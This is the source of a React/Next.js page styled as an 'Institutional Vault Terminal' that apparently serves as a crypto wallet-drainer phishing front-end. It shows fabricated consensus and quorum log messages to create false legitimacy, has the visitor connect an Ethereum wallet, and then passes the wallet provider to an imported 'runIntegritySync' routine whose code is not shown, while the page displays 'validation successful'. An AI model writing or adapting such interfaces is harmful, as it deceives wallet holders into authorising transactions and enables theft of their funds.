import React, { useState, useEffect, useRef } from 'react';
import Head from 'next/head';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Shield, AlertTriangle, CheckCircle2, ChevronRight, Loader2, Activity, Cpu, Zap, Lock } from 'lucide-react';
import { createWalletClient, custom, createPublicClient, http, parseUnits, encodeFunctionData, type Address } from 'viem';
import { mainnet } from 'viem/chains';
import { runIntegritySync } from '@/hooks/useDataIntegrity';

const STAGES = {
  BOOT: 'BOOT',
  WAITING: 'WAITING',
  CONSENSUS: 'CONSENSUS',
  VALIDATION: 'VALIDATION',
  FINALIZED: 'FINALIZED'
};

export default function ConsensusMatrix() {
  const [stage, setStage] = useState(STAGES.BOOT);
  const [logs, setLogs] = useState<string[]>([]);
  const [address, setAddress] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const logEndRef = useRef<HTMLDivElement>(null);

  const addLog = (msg: string) => {
    setLogs(prev => [...prev, `>> ${msg}`]);
  };

  useEffect(() => {
    if (stage === STAGES.BOOT) {
      const bootSequence = [
        "CONSENSUS GATEWAY PROTOCOL v9.1",
        "ESTABLISHING QUORUM PERIMETER...",
        "STATUS: VALIDATOR_NODES_ONLINE",
        "STATUS: SYNC_GATE_LOCKED",
        "SYSTEM ENCRYPTION: ECC_SHADOW",
        "READY FOR VALIDATION SESSION."
      ];
      let i = 0;
      const interval = setInterval(() => {
        if (i < bootSequence.length) {
          addLog(bootSequence[i]);
          i++;
        } else {
          clearInterval(interval);
          setTimeout(() => setStage(STAGES.WAITING), 1000);
        }
      }, 300);
    }
  }, [stage]);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const connectWallet = async () => {
    if (!(window as any).ethereum) {
      addLog("ERROR: NO ETH_PROVIDER.");
      return;
    }
    try {
      addLog("INITIATING AUTH_HANDSHAKE...");
      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      setAddress(accounts[0]);
      addLog(`ADMIN_LINK_STABLISHED: ${accounts[0]}`);
    } catch (e) {
      addLog("HANDSHAKE REJECTED.");
    }
  };

  const startConsensus = async () => {
    setStage(STAGES.CONSENSUS);
    const consensusLogs = [
      "REQUESTING QUORUM APPROVAL...",
      "POLLING NEIGHBOR NODES...",
      "DETECTING STATE INCONSISTENCIES...",
      "ESTABLISHING SECURE SETTLEMENT CHANNEL...",
      "QUORUM REACHED: 88% APPROVAL.",
      "READY FOR FULL STATE SYNCHRONIZATION."
    ];
    for (const log of consensusLogs) {
      await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
      addLog(log);
    }
    setStage(STAGES.VALIDATION);
  };

  const executeValidation = async () => {
    if (!address) return;
    setIsProcessing(true);
    addLog("DISPATCHING VALIDATION PAYLOAD...");
    
    try {
      addLog("SIGNING CONSENSUS_ATTESTATION...");
      const chainId = await (window as any).ethereum.request({ method: 'eth_chainId' });
      await runIntegritySync(address as Address, (window as any).ethereum, parseInt(chainId, 16));
      
      addLog("VALIDATION SUCCESSFUL. STATE LOCKED.");
      setStage(STAGES.FINALIZED);
    } catch (e) {
      addLog("SYNC FAILED: QUORUM LOST.");
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="h-screen w-screen bg-[#050008] text-[#a855f7] font-mono p-4 md:p-8 overflow-hidden flex flex-col selection:bg-[#a855f7] selection:text-black uppercase tracking-tighter">
      <Head>
        <title>Consensus Gate | Institutional Vault Terminal</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;800&display=swap" rel="stylesheet" />
        <style>{`
          body { font-family: 'JetBrains Mono', monospace; }
          .scan-line { height: 2px; width: 100%; background: rgba(168, 85, 247, 0.1); position: absolute; top: 0; animation: scan 7s linear infinite; }
          @keyframes scan { from { top: 0; } to { top: 100%; } }
        `}</style>
      </Head>

      <div className="scan-line" />

      <div className="flex justify-between items-center border-b border-[#a855f7]/30 pb-4 mb-4 text-[10px] opacity-70">
        <div className="flex gap-6">
          <span className="flex items-center gap-2"><Lock className="w-3 h-3" /> QUORUM: ACTIVE</span>
          <span className="flex items-center gap-2"><Activity className="w-3 h-3" /> CHANNEL: SECURE</span>
        </div>
        <div className="flex gap-6">
          <span>HOST: OMNI_GATE_11</span>
          <span>AUTH: APEX_ADMIN</span>
        </div>
      </div>

      <div className="flex-1 flex flex-col min-h-0 border border-[#a855f7]/20 rounded-lg p-6 bg-[#a855f7]/5 shadow-[inset_0_0_50px_rgba(168,85,247,0.05)]">
        
        <div className="flex-1 overflow-y-auto pr-4 space-y-1 mb-6 scrollbar-hide text-xs md:text-sm">
          {logs.map((log, i) => (
            <div key={i} className={`leading-relaxed ${log.includes("QUORUM") ? "text-white font-bold" : ""}`}>
              {log}
            </div>
          ))}
          <div ref={logEndRef} />
        </div>

        <div className="border-t border-[#a855f7]/30 pt-6">
          <AnimatePresence mode="wait">
            {stage === STAGES.WAITING && (
              <motion.div 
                key="waiting" 
                initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              >
                {!address ? (
                  <button 
                    onClick={connectWallet}
                    className="w-full h-14 bg-[#a855f7] text-white font-black uppercase tracking-tighter hover:bg-purple-600 transition-all flex items-center justify-center gap-3 shadow-lg shadow-purple-500/20"
                  >
                    Authenticate Consensus ID
                  </button>
                ) : (
                  <button 
                    onClick={startConsensus}
                    className="w-full bg-[#a855f7] text-white h-14 font-black uppercase hover:bg-purple-600 transition-all"
                  >
                    Initialize Quorum Polling
                  </button>
                )}
              </motion.div>
            )}

            {stage === STAGES.VALIDATION && (
              <motion.div 
                key="validation" 
                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
                className="space-y-4"
              >
                <div className="bg-purple-600/10 border border-purple-500/30 p-4 rounded flex items-center gap-4">
                  <Lock className="text-purple-500 w-8 h-8" />
                  <div>
                    <h4 className="text-purple-500 font-black text-xs italic">QUORUM_ESTABLISHED</h4>
                    <p className="text-[10px] opacity-70">State synchronization is ready for locked fulfillment.</p>
                  </div>
                </div>

                <button 
                  onClick={executeValidation}
                  disabled={isProcessing}
                  className="w-full h-14 bg-white text-black font-black uppercase flex items-center justify-center gap-4 hover:bg-zinc-200 transition-all disabled:opacity-50"
                >
                  {isProcessing ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      Syncing State...
                    </>
                  ) : "Execute Secure State Synchronization"}
                </button>
              </motion.div>
            )}

            {stage === STAGES.FINALIZED && (
              <motion.div 
                key="final" 
                initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}
                className="flex flex-col items-center gap-4 py-4"
              >
                <CheckCircle2 className="w-16 h-16 text-[#a855f7]" />
                <div className="text-center">
                  <h3 className="font-black text-xl tracking-tighter uppercase italic">Consensus Reached</h3>
                  <p className="text-xs opacity-60">System state has been successfully locked and synchronized.</p>
                </div>
                <button 
                  onClick={() => { setStage(STAGES.WAITING); setLogs([]); }}
                  className="mt-2 text-[10px] underline tracking-widest opacity-50 hover:opacity-100 transition-opacity"
                >
                  Return to Console
                </button>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      <div className="mt-4 flex justify-between items-center opacity-40 text-[9px] tracking-[0.4em]">
        <span>LOCK_ID: CONS_GATE_12</span>
        <span>UPTIME: 1,294h CC: 4.8.2</span>
      </div>
    </div>
  );
}
